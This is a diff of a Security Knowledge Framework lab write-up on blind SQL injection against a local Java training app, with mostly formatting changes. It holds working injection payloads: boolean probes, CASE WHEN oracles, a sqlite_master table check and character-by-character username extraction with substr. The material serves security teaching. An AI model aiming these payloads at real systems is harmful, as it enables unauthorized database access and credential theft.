@@ -1,10 +1,8 @@
-# KBID 156 - SQLI \(Blind\)
+# Java - SQLI (Blind)
 
 ## Running the app Java
 
-First make sure java is installed on your host machine.
-After installation, we go to the folder of the lab we want to practice.
-"i.e /skf-labs/XSS, /skf-labs/RFI/" and run the following command:
+First make sure java is installed on your host machine. After installation, we go to the folder of the lab we want to practice. "i.e /skf-labs/XSS, /skf-labs/RFI/" and run the following command:
 
 ```
 $ ./mvnw spring-boot:run
@@ -22,7 +20,7 @@ The first step is to identify parameters which could be potentially used in an S
 
 ![](../../.gitbook/assets/java/SQLI-blind/1.png)
 
-```text
+```
 http://localhost:5000/home/1
 ```
 
@@ -32,7 +30,7 @@ Now let's see if we can create an error by injecting a single quote
 
 ![](../../.gitbook/assets/java/SQLI-blind/2.png)
 
-```text
+```
 http://localhost:5000/home/1'
 ```
 
@@ -42,19 +40,19 @@ However, it's still not possile we can't see this as the application shows a 404
 
 Now we need to inject logic operators to check if the application is vulnerable to SQL Injection.
 
-First, we inject a logical operator which is true \(or 1=1\). This should result in the application run as intended without errors.
+First, we inject a logical operator which is true (or 1=1). This should result in the application run as intended without errors.
 
 ![](../../.gitbook/assets/java/SQLI-blind/3.png)
 
-```text
+```
 http://localhost:5000/home/1 OR 1=1
 ```
 
-After that we inject a logical operator which is false \(and 1=2\). This should result in the application returning an error.
+After that we inject a logical operator which is false (and 1=2). This should result in the application returning an error.
 
 ![](../../.gitbook/assets/java/SQLI-blind/4.png)
 
-```text
+```
 http://localhost:5000/home/1 AND 1=2
 ```
 
@@ -80,13 +78,13 @@ We need to determine which conditions are TRUE and FALSE for the application. By
 
 ![](../../.gitbook/assets/java/SQLI-blind/5.png)
 
-```text
+```
 http://localhost:5000/home/1
 ```
 
 ![](../../.gitbook/assets/java/SQLI-blind/6.png)
 
-```text
+```
 http://localhost:5000/home/4
 ```
 
@@ -96,7 +94,7 @@ Now, we need to inject a IF condition, returning 1 for the TRUE cases and 4 for 
 
 ![](../../.gitbook/assets/java/SQLI-blind/7.png)
 
-```text
+```
 http://localhost:5000/home/(select case when 1=1 then 1 else 4 end)
 ```
 
@@ -108,7 +106,7 @@ Let's check if the table users exists.
 
 ![](../../.gitbook/assets/java/SQLI-blind/8.png)
 
-```text
+```
 http://localhost:5000/home/(select case when tbl_name='users' then 1 else 4 end from sqlite_master where type='table')
 ```
 
@@ -122,13 +120,13 @@ By testing different table names, we will receive an 404 error, indicating the t
 
 From the _user_ table is possible to see that the table contains the columns _UserId_ , _UserName_ and _Password_
 
-![](../../.gitbook/assets/java/SQLI-blind/10.png)
+![](../../.gitbook/assets/nodejs/SQLI-blind/10.png)
 
 Let's try to extract a valid user. Instead of having a dictionary of possible users to guess, we can check if the first letter of the first user contains the letter _a_.
 
 ![](../../.gitbook/assets/java/SQLI-blind/11.png)
 
-```text
+```
 http://localhost:5000/home/(select case when substr(UserName,1,1)='a' then 1 else 4 end from users limit 0,1)
 ```
 
@@ -136,7 +134,7 @@ The error indicates it's not the case. Let's try with the letter _A_. Remember, 
 
 ![](../../.gitbook/assets/java/SQLI-blind/12.png)
 
-```text
+```
 http://localhost:5000/home/(select case when substr(UserName,1,1)='A' then 1 else 4 end from users limit 0,1)
 ```
 
@@ -144,19 +142,19 @@ Yes, it matches!
 
 As initial guess, _Admin_ could be a possible user. So, let's test this theory:
 
-```text
+```
 http://localhost:5000/home/(select case when substr(UserName,2,1)='d' then 1 else 4 end from users limit 0,1)
 ```
 
-```text
+```
 http://localhost:5000/home/(select case when substr(UserName,3,1)='m' then 1 else 4 end from users limit 0,1)
 ```
 
-```text
+```
 http://localhost:5000/home/(select case when substr(UserName,4,1)='i' then 1 else 4 end from users limit 0,1)
 ```
 
-```text
+```
 http://localhost:5000/home/(select case when substr(UserName,5,1)='n' then 1 else 4 end from users limit 0,1)
 ```
 
